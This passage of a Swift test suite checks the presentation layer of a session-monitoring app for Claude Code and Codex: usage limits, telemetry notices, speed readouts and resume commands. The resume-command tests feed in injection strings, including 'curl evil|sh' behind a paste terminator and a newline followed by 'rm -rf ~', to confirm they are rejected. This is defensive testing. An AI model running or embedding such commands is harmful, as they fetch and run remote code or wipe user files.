    check(expired.isShown(now: now) && !UsageLimitSummary(usedPercent: 64, windowMinutes: 300, resetsAt: at(-day - 1), recordedAt: at(-2 * day)).isShown(now: now)
          && usage?.isShown(now: now) == true, "expired windows hide after a day")

    // Claude limits from the status line bridge: the Codex row's rules, the higher live window, the other one in help.
    func claudeWindow(_ percent: Double, resetsIn: TimeInterval, received: TimeInterval = -60) -> ClaudeLimitWindow {
        ClaudeLimitWindow(usedPercent: percent, resetsAt: at(resetsIn), receivedAt: at(received))
    }
    let bothLive = ClaudeUsageLimits(fiveHour: claudeWindow(42, resetsIn: 2 * 3_600 + 13 * 60 + 30), sevenDay: claudeWindow(31, resetsIn: 3 * day + 4 * 3_600 + 30))
    let claudeSummary = SessionPresentation.claudeUsageLimit(bothLive, now: now)
    check(claudeSummary?.title == "Claude 5시간 한도" && claudeSummary?.value(now: now) == "42% 사용" && claudeSummary?.source == .claude
          && claudeSummary?.details(now: now) == ["2시간 13분 후 초기화 · 1분 전 기록", "2시간 13분 후 초기화"]
          && claudeSummary?.help(now: now).hasSuffix("\n주간 한도 31% 사용 · 3일 4시간 후 초기화") == true
          && claudeSummary?.spoken(now: now) == "42퍼센트 사용, 2시간 13분 후 초기화, 1분 전 기록 기준, 주간 한도 31퍼센트 사용, 3일 4시간 후 초기화",
          "Claude limit row: higher live window, Codex row wording, the other window in help and VoiceOver")
    let weeklyHigher = SessionPresentation.claudeUsageLimit(ClaudeUsageLimits(fiveHour: claudeWindow(30, resetsIn: 600),
                                                                              sevenDay: claudeWindow(30, resetsIn: 2 * day)), now: now)
    let fiveHourReset = SessionPresentation.claudeUsageLimit(ClaudeUsageLimits(fiveHour: claudeWindow(97, resetsIn: -60),
                                                                               sevenDay: claudeWindow(55, resetsIn: 2 * day)), now: now)
    check(weeklyHigher?.title == "Claude 주간 한도" && fiveHourReset?.title == "Claude 주간 한도" && fiveHourReset?.usedPercent == 55
          && fiveHourReset?.other == nil && fiveHourReset?.help(now: now).contains("\n") == false,
          "a tie goes to the longer window; a reset window never outranks a live one")
    let allReset = SessionPresentation.claudeUsageLimit(ClaudeUsageLimits(fiveHour: claudeWindow(77, resetsIn: -1_200, received: -9_000),
                                                                          sevenDay: claudeWindow(58, resetsIn: -600, received: -9_000)), now: now)
    check(allReset?.expired(now: now) == true && allReset?.value(now: now) == "—" && allReset?.title == "Claude 주간 한도"
          && allReset?.details(now: now) == ["초기화됨 · 다음 Claude Code 기록 대기"] && allReset?.isShown(now: now) == true
          && SessionPresentation.claudeUsageLimit(ClaudeUsageLimits(fiveHour: claudeWindow(77, resetsIn: -day - 1)), now: now)?.isShown(now: now) == false
          && SessionPresentation.claudeUsageLimit(ClaudeUsageLimits(), now: now) == nil,
          "reset Claude windows read like Codex's: a dash for a day, then gone")
    check(claudeSummary?.isOld(now: now) == false && SessionPresentation.claudeUsageLimit(
            ClaudeUsageLimits(sevenDay: claudeWindow(31, resetsIn: day, received: -900)), now: now)?.isOld(now: now) == true,
          "a Claude limit received over 10 minutes ago reads weaker")
    // The Claude desktop app's usage history: the last sample only, no reset time (none is shown), reset one window after it.
    let desktopAt = Date(timeIntervalSince1970: 1_790_000_000)
    func desktop(_ version: Int, recorded: TimeInterval) -> ClaudeUsageLimits? {
        let t = Int(desktopAt.addingTimeInterval(recorded).timeIntervalSince1970 * 1_000)
        return ClaudeUsageLimits.decodeDesktopHistory(Data(#"{"version":\#(version),"samples":[{"t":1789000000000,"org":"x","u":{"fh":90,"sd":90}},{"t":\#(t),"org":"x","u":{"fh":17,"sd":5}}]}"#.utf8))
    }
    let desktopLive = desktop(2, recorded: -720)
    let desktopSummary = desktopLive.flatMap { SessionPresentation.claudeUsageLimit($0, now: desktopAt) }
    let desktopOld = desktop(2, recorded: -6 * 3_600).flatMap { SessionPresentation.claudeUsageLimit($0, now: desktopAt) }
    check(desktop(1, recorded: -720) == nil && desktopLive?.fiveHour == ClaudeLimitWindow(usedPercent: 17, resetsAt: nil, receivedAt: desktopAt.addingTimeInterval(-720))
          && desktopSummary?.value(now: desktopAt) == "17% 사용" && desktopSummary?.details(now: desktopAt) == ["12분 전 기록"]
          && desktopSummary?.other == nil && desktopOld?.title == "Claude 주간 한도" && desktopOld?.usedPercent == 5,
          "Claude desktop usage: last sample only, no invented reset time, a 5-hour value gone after five hours")
    // Receipts merge per window (newer wins, a missing window is kept) and persist as numbers and times only.
    let newer = ClaudeUsageLimits(fiveHour: claudeWindow(44, resetsIn: 7_000, received: -5))
    let merged = bothLive.merged(newer).merged(ClaudeUsageLimits(fiveHour: claudeWindow(10, resetsIn: 7_000, received: -500)))
    check(merged.fiveHour?.usedPercent == 44 && merged.sevenDay == bothLive.sevenDay, "newer receipts win per window")
    let suite = "TokenCat-check-\(UUID().uuidString)"
    if let defaults = UserDefaults(suiteName: suite) {
        merged.save(to: defaults)
        let stored = defaults.data(forKey: ClaudeUsageLimits.defaultsKey).flatMap { try? JSONSerialization.jsonObject(with: $0) as? [String: Any] }
        let keys = Set(((stored?["fiveHour"] as? [String: Any]) ?? [:]).keys)
        check(ClaudeUsageLimits.load(from: defaults) == merged && keys == ["usedPercent", "resetsAt", "receivedAt"],
              "Claude limits persist as numbers and times only and survive a restart")
        ClaudeUsageLimits().save(to: defaults)
        check(defaults.data(forKey: ClaudeUsageLimits.defaultsKey) == nil && ClaudeUsageLimits.load(from: defaults).isEmpty,
              "empty Claude limits clear the stored value")
        defaults.removePersistentDomain(forName: suite)
    } else { check(false, "temporary defaults suite unavailable") }

    // Effort, last turn and help ages.
    var effort = command
    effort.effort = "XHigh"
    check(SessionPresentation.effortLabel(effort) == "xhigh" && SessionPresentation.effortLabel(command) == nil, "effort is raw lowercase")
    var finished = reading("claude:f", state: .complete)
    finished.lastOutputTokens = 7_493
    let partial = finished
    finished.lastTurnDurationSeconds = 252
    check(SessionPresentation.lastTurnSummary(finished) == "마지막 완료 턴 출력 7,493 tok · 소요 4:12"
          && SessionPresentation.lastTurnSummary(partial) == "마지막 출력 기록 7,493 tok"
          && SessionPresentation.lastTurnSummary(finished)?.contains("/s") == false, "turn output and duration are never divided")
    check(SessionPresentation.helpAge(at(-45), now: now) == "1분 이내" && SessionPresentation.helpAge(at(-200), now: now) == "3분 전"
          && SessionPresentation.helpAge(nil, now: now) == "기록 없음", "help ages are minute-granular")
    check(SessionPresentation.recordAge(at(-3), now: now) == "방금" && SessionPresentation.recordAge(at(-9.9), now: now) == "방금"
          && SessionPresentation.recordAge(at(-10), now: now) == "10초 전" && SessionPresentation.recordAge(at(-47), now: now) == "40초 전"
          && SessionPresentation.recordAge(at(-200), now: now) == "3분 전" && SessionPresentation.recordAge(at(3), now: now) == "방금",
          "record ages: 방금, 10 s steps, then minutes")
    check(SessionPresentation.spokenDuration(at(-45), now: now) == "45초" && SessionPresentation.spokenDuration(at(-252), now: now) == "4분"
          && SessionPresentation.spokenDuration(at(-3_900), now: now) == "1시간 5분", "spoken durations read minutes past a minute")

    // Footer telemetry notice by collector state, never by matching status text.
    let port = SessionPresentation.telemetryNotice(state: .busyOtherApp, note: nil, restart: [])
    let conflict = SessionPresentation.telemetryNotice(state: .waiting, note: "실측 연결: Codex otel 키가 중복되거나 여러 줄 형식이어서 변경하지 않았습니다.",
                                                       failure: .conflict, restart: [.claude])
    let failed = SessionPresentation.telemetryNotice(state: .waiting, note: "설정 저장 중 일부 파일이 변경됐습니다.", failure: .writeFailed(restored: false), restart: [])
    let restart = SessionPresentation.telemetryNotice(state: .receiving, note: nil, restart: [.claude, .codex])
    let otherTokenCat = SessionPresentation.telemetryNotice(state: .busyTokenCat, note: nil, restart: [])
    let broken = SessionPresentation.telemetryNotice(state: .failed, note: nil, restart: [.claude])
    let stopped = SessionPresentation.telemetryNotice(state: .stopped, status: "실측 꺼짐 · 실행 중인 TokenCat 수집기 없음", note: nil, restart: [])
    let expiredNotice = SessionPresentation.telemetryNotice(state: .waiting, note: nil, restart: [.claude], expired: [.codex])
    check(otherTokenCat?.kind == .busy && otherTokenCat?.text == "실측 꺼짐 · 다른 TokenCat" && port?.kind == .portBusy
          && broken?.kind == .collector && broken?.text == "실측 꺼짐 · 수집기 오류" && broken?.help.hasPrefix("실측 꺼짐 · 수집기를 시작하지 못함") == true
          && stopped?.kind == .off && stopped?.help.hasPrefix("실측 꺼짐 · 실행 중인 TokenCat 수집기 없음") == true
          && [otherTokenCat, port, broken, stopped].allSatisfy { $0?.collectorDown == true } && conflict?.collectorDown == false,
          "collector states keep their cause")
    check(expiredNotice?.kind == .expired && expiredNotice?.text == "실측 미수신 · 확인 필요" && expiredNotice?.isProblem == true
          && expiredNotice?.help.hasPrefix("Codex: 이 버전에서 실측을 받지 못했습니다") == true, "a day without a receipt asks for a check")
    check(port?.text == "실측 꺼짐 · 포트 사용 중" && conflict?.text == "실측 꺼짐 · 설정 충돌"
          && failed?.kind == .failed && restart?.text == "재시작 후 실측 표시" && restart?.isProblem == false
          && restart?.help.hasPrefix("Codex · Claude Code를 새로 실행하면") == true, "telemetry notice causes")
    check([TelemetryCollectorState.receiving, .waiting, .starting].allSatisfy { SessionPresentation.telemetryNotice(state: $0, note: nil, restart: []) == nil }
          && [port, conflict, failed, restart, otherTokenCat, broken, expiredNotice].allSatisfy { ($0?.text.filter { $0 != " " }.count ?? 0) <= 15 },
          "no notice while healthy; copy stays short")
    // The footer's one item, by priority.
    func footer(_ loading: Bool, _ ai: Int, _ system: Int, _ notice: TelemetryNotice?) -> FooterStatus {
        SessionPresentation.footerStatus(loading: loading, tokenDelay: ai, systemDelay: system, notice: notice)
    }
    check(footer(true, 20, 20, port) == FooterStatus(kind: .loading, text: "준비 중") && footer(false, 12, 5, port) == FooterStatus(kind: .aiDelay, text: "AI 수집 지연 12초")
          && footer(false, 3, 4, port) == FooterStatus(kind: .systemDelay, text: "시스템 수집 지연 4초")
          && footer(false, 0, 0, port) == FooterStatus(kind: .notice, text: "실측 꺼짐 · 포트 사용 중")
          && footer(false, 0, 0, restart).text == "재시작 후 실측 표시" && footer(false, 0, 0, nil) == FooterStatus(kind: .live, text: "실시간"),
          "footer priority: AI delay, system delay, notice, live")
    check(OnboardingCard.outcome(notice: port, note: nil, failure: nil, state: .busyOtherApp) == .collectorDown("실측 꺼짐 · 포트 사용 중")
          && OnboardingCard.outcome(notice: conflict, note: "실측 연결: 이유", failure: .conflict, state: .waiting) == .skipped("이유")
          && OnboardingCard.outcome(notice: failed, note: "이유", failure: .writeFailed(restored: false), state: .waiting) == .failed("이유")
          && OnboardingCard.outcome(notice: nil, note: nil, failure: nil, state: .starting) == .preparing
          && OnboardingCard.outcome(notice: nil, note: nil, failure: nil, state: .receiving) == .added(bridged: false)
          && OnboardingCard.outcome(notice: nil, note: nil, failure: nil, state: .waiting, bridged: true) == .added(bridged: true)
          && OnboardingCard.outcome(notice: conflict, note: "이유", failure: .conflict, state: .waiting, bridged: true) == .skipped("이유"),
          "first-run outcome says only what happened")
    let restartSlot = SessionPresentation.speed(question, now: now, restartNeeded: true)
    check(restartSlot.value == "—" && restartSlot.help == "실측 연결됨 · Claude Code를 새로 실행하면 속도가 표시됩니다",
          "restart-needed speed help")
    var codexMeasured = command
    var codexMeasurement = TokenSpeedMeasurement(TelemetryReading(provider: .codex, at: at(-130)))
    codexMeasurement.serverTokenIntervalMs = 20
    codexMeasured.speedMeasurement = codexMeasurement
    check(SessionPresentation.telemetryReceipt(SessionPresentation.measuredAt([codexMeasured, question]), now: now)
            == "실측 수신: Codex 2분 전 · Claude Code 기록 없음"
          && SessionPresentation.telemetryReceipt([.claude: at(-30)], now: now) == "실측 수신: Codex 기록 없음 · Claude Code 1분 이내",
          "telemetry receipt per provider")

    // Row actions copy or reveal; the log path comes from the reading id.
    var located = claudeParent
    located.id = "claude:.claude/projects/-work-TokenCat/S1.jsonl"
    located.projectPath = "/work/TokenCat"
    let home = URL(fileURLWithPath: "/Users/example")
    let actions = SessionPresentation.rowActions(located, home: home)
    check(actions.map(\.title) == ["세션 ID 복사", "재개 명령 복사", "프로젝트 폴더 Finder에서 보기", "기록 파일 Finder에서 보기"]
          && actions[3].kind == .reveal(home.appendingPathComponent(".claude/projects/-work-TokenCat/S1.jsonl"))
          && actions.map(\.isReveal) == [false, false, true, true]
          && SessionPresentation.logFileURL(located, home: home)?.path == "/Users/example/.claude/projects/-work-TokenCat/S1.jsonl"
          && SessionPresentation.rowActions(claudeChild, home: home).map(\.title) == ["세션 ID 복사", "에이전트 ID 복사"]
          && SessionPresentation.rowActions(telemetry, home: home).map(\.title) == ["세션 ID 복사"], "row actions: copies, then reveals")
    // Resume command (decision 7): single-quoted folder, hidden for subagents or without an ID or folder.
    var quoted = located
    quoted.projectPath = "/work/it's here"
    var codexRoot = codexParent
    codexRoot.projectPath = "/work/TokenCat"
    var odd = located
    odd.sessionID = "S 1;x"
    var relative = located
    relative.projectPath = "work/TokenCat"
    check(SessionPresentation.resumeCommand(located) == "cd '/work/TokenCat' && claude --resume S1"
          && SessionPresentation.resumeCommand(quoted) == "cd '/work/it'\\''s here' && claude --resume S1"
          && SessionPresentation.resumeCommand(codexRoot) == "cd '/work/TokenCat' && codex resume R1"
          && SessionPresentation.resumeCommand(odd) == "cd '/work/TokenCat' && claude --resume 'S 1;x'"
          && SessionPresentation.resumeCommand(claudeChild) == nil && SessionPresentation.resumeCommand(codexParent) == nil
          && SessionPresentation.resumeCommand(relative) == nil && SessionPresentation.resumeCommand(telemetry) == nil,
          "resume command quoting and hiding")
    var fishEscape = located
    fishEscape.projectPath = "/work/x\\';touch P;#"
    var pasteKeys = located
    pasteKeys.projectPath = "/work/x\u{1b}[201~\u{15}curl evil|sh\r"
    var controlID = located
    controlID.sessionID = "S1\nrm -rf ~"
    check(SessionPresentation.resumeCommand(fishEscape) == nil && SessionPresentation.resumeCommand(pasteKeys) == nil
          && SessionPresentation.resumeCommand(controlID) == nil,
          "resume command offered for a path or ID with a backslash or control characters (fish quoting, paste injection)")
    // Inline detail (S-6): metadata only, 16 + 15 per line + 0.5.
    var detailed = command
    detailed.model = "gpt-6.1-sol"
    detailed.effort = "high"
    detailed.lastOutputTokens = 7_493
    detailed.lastTurnDurationSeconds = 252
    let details = SessionPresentation.detailItems(detailed, state: .tool)
    check(details.map(\.label) == ["세션 ID", "모델", "도구", "마지막 완료 턴", "기록 시점"]
          && details.map(\.value) == ["C", "gpt-6.1-sol · high", "명령 실행 · exec", "7,493 tok · 4:12", "Codex는 응답 완료 시 기록"]
          && details[0].copy == "C" && details[1].copy == nil
          && SessionPresentation.detailHeight(detailed, state: .tool) == 16 + 15 * 5 + 0.5
          && SessionPresentation.detailItems(claudeChild, state: .working).map(\.label) == ["세션 ID", "에이전트", "기록 시점"]
          && SessionPresentation.detailItems(claudeChild, state: .working).last?.value == "Claude Code는 메시지 완료 시 기록",
          "inline detail lines and height")

    // System and header mappings.
    check(MemoryPressure(1) == .normal && MemoryPressure(2) == .warning && MemoryPressure(4) == .critical && MemoryPressure(nil) == .unknown
          && MemoryPressure(4).title == "위험", "memory pressure levels")

    // Wall-clock buckets: the newest starts at floor(now / 5) * 5, future records clamp, old records drop.
    var flowReading = reading("codex:flow", .codex)
    flowReading.recentOutputs = [
        TokenOutputEvent(at: Date(timeIntervalSince1970: 1_000_000.5), tokens: 10),
        TokenOutputEvent(at: Date(timeIntervalSince1970: 999_999.9), tokens: 20),
        TokenOutputEvent(at: Date(timeIntervalSince1970: 1_000_007), tokens: 40),
        TokenOutputEvent(at: Date(timeIntervalSince1970: 1_000_009), tokens: 80),
        TokenOutputEvent(at: Date(timeIntervalSince1970: 999_705), tokens: 160),
        TokenOutputEvent(at: Date(timeIntervalSince1970: 999_700), tokens: 320)
    ]
    var claudeFlow = reading("claude:flow")
    claudeFlow.recentOutputs = [TokenOutputEvent(at: Date(timeIntervalSince1970: 999_990), tokens: 5)]
    var telemetryFlow = reading("telemetry:x")
    telemetryFlow.recentOutputs = [TokenOutputEvent(at: now, tokens: 1_000)]
    let flow = FlowSeries.make([flowReading, claudeFlow, telemetryFlow], now: now)
    check(flow.newest == Date(timeIntervalSince1970: 1_000_000) && flow.hero.count == 60, "newest bucket is wall-clock aligned")
    check(flow.hero[59] == 50 && flow.hero[58] == 20 && flow.hero[0] == 160 && flow.hero[57] == 5 && flow.total == 235,
          "records land in aligned buckets; >5 s future and out-of-window records drop")
    check(flow.fresh[59] && flow.fresh[58] && !flow.fresh[57], "fresh marks buckets holding a record from the last 5 s")
    check(flow.byProvider[.codex] == 230 && flow.byProvider[.claude] == 5 && flow.last?.tokens == 40
          && flow.last?.at == Date(timeIntervalSince1970: 1_000_007), "provider totals and last record")
    check(flow.byProvider[.codex] == 230 && FlowSeries.make([telemetryFlow], now: now).total == 0, "telemetry contributes nothing")
    let shifted = FlowSeries.make([flowReading], now: Date(timeIntervalSince1970: 1_000_004.9))
    let next = FlowSeries.make([flowReading], now: Date(timeIntervalSince1970: 1_000_005))
    check(shifted.newest == flow.newest && shifted.hero[58] == 20 && shifted.hero[0] == 160
          && next.hero[57] == 20 && next.hero[58] == 10, "buckets stay put within an interval and shift on the boundary")
    check(niceMax(200) == 200 && niceMax(201) == 300 && niceMax(786) == 800 && niceMax(1_001) == 1_500 && niceMax(5_000) == 5_000
          && niceMax(6_100) == 8_000 && niceMax(8_100) == 10_000 && niceMax(0) == 1, "nice scale rounds to {1, 1.5, 2, 3, 4, 5, 6, 8} × 10ⁿ")
    let fills = stride(from: 1.0, through: 100_000, by: 7.3).map { $0 / niceMax($0) }
    check(fills.allSatisfy { $0 >= 2.0 / 3 - 1e-9 && $0 <= 1 }, "the tallest bar fills at least 2/3 of the plot")
    let speck = FlowBars(values: [0, 1], scale: 1_000).path(in: CGRect(x: 0, y: 0, width: 4, height: 36))
    let tall = FlowBars(values: [10], scale: 10).path(in: CGRect(x: 0, y: 0, width: 10, height: 36))
    check(speck.boundingRect.height == 2 && speck.boundingRect.width == 2 && tall.boundingRect.width == 6
          && tall.contains(CGPoint(x: 2.05, y: 35.95)) && !tall.contains(CGPoint(x: 2.05, y: 0.05)),
          "bars are at least 2 × 2 pt, 0.6 of the slot, with square bottoms and rounded tops")

    // Formats and honest speed.
    check(Format.tokens(786) == "786" && Format.tokens(12_480) == "12,480" && Format.tokens(123_400) == "123.4k"
          && Format.tokens(1_234_567) == "1.23M" && Format.tokens(999_960) == "1.00M", "token format")
    check(Format.compactTokens(786) == "786" && Format.compactTokens(8_100) == "8.1k" && Format.compactTokens(1_000) == "1k"
          && Format.compactTokens(1_200_000) == "1.2M", "compact token format")
    check(Format.age(at(-3), now: now) == "3초 전" && Format.age(at(-200), now: now) == "3분 전" && Format.age(at(5), now: now) == "0초 전",
          "ages use the model clock")
    let unknown = SessionPresentation.speed(claudeParent, now: now)
    check(unknown.value == "—" && !unknown.known, "unknown speed is a dash")
    var previous = reading("claude:prev")
    previous.model = "claude-opus-5-5"
    var previousMeasurement = TokenSpeedMeasurement(TelemetryReading(provider: .claude, at: at(-30)))
    previousMeasurement.model = "claude-haiku"
    previousMeasurement.outputTokens = 441
    previousMeasurement.requestDurationMs = 10_000
    previous.speedMeasurement = previousMeasurement
    let previousSlot = SessionPresentation.speed(previous, now: now)
    check(previousSlot.prefix == "이전" && previousSlot.value == "44.1" && !previousSlot.recent
          && previousSlot.help == "이전 실측 모델 claude-haiku · 측정 1분 이내", "previous-model measurement is labelled, minute-granular")
    previous.model = "claude-haiku"
    let currentSlot = SessionPresentation.speed(previous, now: now)
    check(currentSlot.prefix == nil && currentSlot.recent && currentSlot.kind == "요청 tok/s", "current-model measurement")

    // "지금 속도": the newest fresh measurement of one visible live session; never a sum or an average.
    func timed(_ id: String, _ source: TokenSource, project: String, model: String, measured: String? = nil, ago: TimeInterval,
               interval: Double? = nil, live: Bool = true) -> TokenReading {
        var value = reading(id, source, session: id.uppercased(), project: project, active: live, state: live ? .working : .complete, last: -2)
        value.model = model
        var measurement = TokenSpeedMeasurement(TelemetryReading(provider: source, at: at(ago)))
        measurement.model = measured ?? model
        if let interval { measurement.serverTokenIntervalMs = interval } else {
            measurement.outputTokens = 441
            measurement.requestDurationMs = 10_000
        }
        value.speedMeasurement = measurement
        return value
    }
    func headline(_ tokens: [TokenReading], restart: Set<TokenSource> = []) -> SpeedHeadline? {
        SessionPresentation.speedHeadline(make(tokens), now: now, restart: restart)
    }
    let speedAlpha = timed("claude:alpha", .claude, project: "Alpha", model: "m1", ago: -30)
    let speedBeta = timed("codex:beta", .codex, project: "Beta", model: "g1", ago: -10, interval: 20)
    let pair = headline([speedAlpha, speedBeta])
    check(pair?.value == "50.0" && pair?.kind == "생성 tok/s" && pair?.project == "Beta" && pair?.spoken == "생성 속도 초당 50.0 토큰, Beta"
          && pair?.help.hasPrefix("Beta · Codex g1 · 측정 1분 이내\n서버 실측 토큰 간 시간 20.000 ms") == true
          && pair?.help.hasSuffix("세션끼리 합치거나 평균내지 않습니다") == true,
          "the newest fresh measurement wins, with its kind and session; 44.1 and 50.0 are never summed or averaged")
    let switched = timed("codex:beta", .codex, project: "Beta", model: "g1", measured: "g0", ago: -5, interval: 20)
    check(headline([speedAlpha, switched])?.value == "44.1" && headline([speedAlpha, switched])?.kind == "요청 tok/s",
          "a measurement from the session's previous model is left out")
    let restartWaiting = headline([speedAlpha, speedBeta], restart: [.codex, .claude])
    check(headline([speedAlpha, speedBeta], restart: [.codex])?.project == "Alpha"
          && restartWaiting?.value == "—" && restartWaiting?.known == false && restartWaiting?.help == "실측 연결됨 · Codex · Claude Code를 새로 실행하면 속도가 표시됩니다",
          "clients waiting for a restart are left out, like the row speed")
    let staleAlpha = timed("claude:alpha", .claude, project: "Alpha", model: "m1", ago: -130)
    let stalePair = headline([staleAlpha, timed("codex:beta", .codex, project: "Beta", model: "g1", ago: -121, interval: 20)], restart: [.codex])
    check(stalePair?.value == "—" && stalePair?.spoken == "속도 실측 없음"
          && stalePair?.help == "진행 중인 세션의 최근 2분 실측 없음 · 로그 시각으로 추정하지 않습니다\nCodex를 새로 실행하면 속도가 표시됩니다",
          "running sessions without a measurement under 2 minutes show a dash, with why in help")
    let previousOnly = headline([switched])
    check(previousOnly?.value == "—" && previousOnly?.help == "최근 실측은 이전 모델(g0) 기준이라 지금 속도로 쓰지 않습니다",
          "a fresh measurement left out for its previous model is named as such, not as a missing one")
    // The card keeps one height whether or not "지금 속도" shows.
    check(FlowCard.lowerHeight(loading: false, total: 120, speed: nil) == 18 && FlowCard.lowerHeight(loading: false, total: 120, speed: pair) == 18
          && FlowCard.lowerHeight(loading: false, total: 0, speed: nil) == nil && FlowCard.lowerHeight(loading: true, total: 120, speed: pair) == nil,
          "the speed slot does not resize the flow card")
    let quiet = timed("claude:quiet", .claude, project: "Quiet", model: "m1", ago: -3, live: false)
    let unmatched = timed("telemetry:claude:x", .claude, project: "요청 실측", model: "m1", ago: -3, live: false)
    check(headline([quiet, unmatched]) == nil && headline([]) == nil, "nothing running hides the speed, even beside a fresh unmatched measurement")
    var logWait = timed("claude:wait", .claude, project: "Wait", model: "m1", ago: -300)
    logWait.active = false
    logWait.activityState = .stale
    var asking = timed("codex:ask", .codex, project: "Ask", model: "g1", ago: -300)
    asking.activityState = .input
    var freshWait = logWait
    freshWait.speedMeasurement?.at = at(-20)
    check(headline([logWait, asking]) == nil && headline([freshWait, asking])?.value == "44.1",
          "sessions only waiting for a log or the person show no placeholder, but a fresh measurement of theirs still shows")
    var helper = timed("claude:alpha/sub", .claude, project: "Alpha", model: "m1", ago: -4)
    helper.sessionID = "CLAUDE:ALPHA"
    helper.isSubagent = true
    helper.agentID = "a1111111e1"
    helper.agentRole = "Explore"
    let child = headline([speedAlpha, helper])
    check(child?.value == "44.1" && child?.help.hasPrefix("Alpha · 하위 Explore · Claude Code m1") == true,
          "a visible live subagent's own measurement counts and is named")

    // English: plurals, word order, spoken text and composed titles.
    AppLanguage.with(.en) {
        check(header(urgent).spoken == "1 session needs input · 2 working" && header(plans).spoken == "2 plans awaiting approval · 1 working"
              && header(retryOnly).spoken == "1 session retrying · Retry 2/10 · in 4s"
              && header(retryOnly, spoken: true).spoken == "1 session retrying · Retry 2/10 · in 4 seconds"
              && header(noticeCounts, spoken: true).spoken == "1 session waiting for log · no record for 3 minutes"
              && header(SessionCounts(SessionPresentation.groups([claudeParent, claudeChild, codexParent, codexChild], now: now))).spoken
                == "2 sessions working · 1 tool · 2 subagents"
              && caption(urgent, -40).text == "Waiting for input · reply to resume" && caption(plans, nil).text == "Plan approval · approve to resume"
              && caption(retryOnly, -40).text == "API retry 2/10 · in 4s" && caption(noticeCounts, nil).text == "Waiting for log · no record for 3m",
              "English header and flow caption")
        check(SessionPresentation.childGroupText(.input, count: 1) == "1 subagent needs input"
              && SessionPresentation.childGroupText(.waiting, count: 4) == "4 subagents waiting for log"
              && SessionPresentation.spokenLabel(modelled, state: .input) == "Input needed, TokenCat, Claude Code claude-opus-5-5"
              && SessionPresentation.spokenLabel(codexChild, state: .working) == "Subagent sample_runner, Working"
              && make([floodParent] + flood).blocks.first?.moreText == "+9 subagents waiting for log · last record 1m ago"
              && make([floodParent] + flood).blocks.first?.moreSpoken == "+9 subagents waiting for log · last record 1 minute ago",
              "English subagent counts and VoiceOver labels")
        check(usage?.title == "Codex weekly limit" && usage?.value(now: now) == "28% used"
              && usage?.detail(now: now) == "Resets in 5d 11h · as of 1m ago"
              && usage?.details(now: now) == ["Resets in 5d 11h · recorded 1m ago", "Resets in 5d 11h"]
              && undated?.detail(now: now) == "As of 10m ago" && expired.detail(now: now) == "Reset · waiting for a Codex record"
              && claudeSummary?.spoken(now: now) == "42 percent used, Resets in 2 hours 13 minutes, as of 1 minute ago, Weekly limit 31 percent used, resets in 3 days 4 hours"
              && claudeSummary?.help(now: now).hasSuffix("\nWeekly limit 31% used · resets in 3d 4h") == true,
              "English usage limit copy")
        check(SessionPresentation.context(codexContext, now: now)?.text == "Context 61% used"
              && SessionPresentation.context(codexContext, now: now)?.spoken == "Context 61 percent used"
              && SessionPresentation.context(claudeContext, now: now)?.compacted == "Compacted 5m ago"
              && headline([speedAlpha, speedBeta])?.spoken == "Generation speed 50.0 tokens per second, Beta"
              && SessionPresentation.lastTurnSummary(finished) == "Last completed turn: 7,493 tok · took 4:12"
              && SessionPresentation.footerStatus(loading: false, tokenDelay: 12, systemDelay: 0, notice: nil).text == "AI collection delayed 12s"
              && SessionPresentation.telemetryNotice(state: .busyOtherApp, note: nil, restart: [])?.text == "Telemetry off · port in use",
              "English context, speed, turn and footer copy")
        let englishDates = make([beta] + dated, expanded: true)
        check(englishDates.blocks.map(\.section) == [nil, "Today", "Yesterday", "Earlier", "Earlier"] && englishDates.olderCount == 2
              && SessionPresentation.rowActions(located, home: home).map(\.title)
                == ["Copy Session ID", "Copy Resume Command", "Show Project Folder in Finder", "Show Log File in Finder"]
              && SessionPresentation.detailItems(detailed, state: .tool).last?.value == "When a Codex response ends",
              "English day sections fold the older part; row actions use title case")
    }

    // Fixture PNGs carry only visibly fake identifiers.
    let fixtureReadings = SnapshotFixtures.fixtures().flatMap(\.tokens)
    func synthetic(_ agent: String) -> Bool {
        let digits = Array(agent.dropFirst().prefix(7))
        return agent.hasPrefix("a") && digits.count == 7 && digits.allSatisfy { $0 == digits[0] && $0.isNumber }
    }
    check(!fixtureReadings.isEmpty
          && fixtureReadings.allSatisfy { $0.sessionID?.hasPrefix(SnapshotFixtures.sessionPrefix) ?? true }
          && fixtureReadings.filter { $0.source == .claude && $0.isSubagent }.allSatisfy { $0.agentID.map(synthetic) ?? false },
          "fixture IDs are synthetic")

    print("Session presentation checks: \(checks - failures.count) PASS / \(failures.count) FAIL / 0 SKIP")
    return failures
}
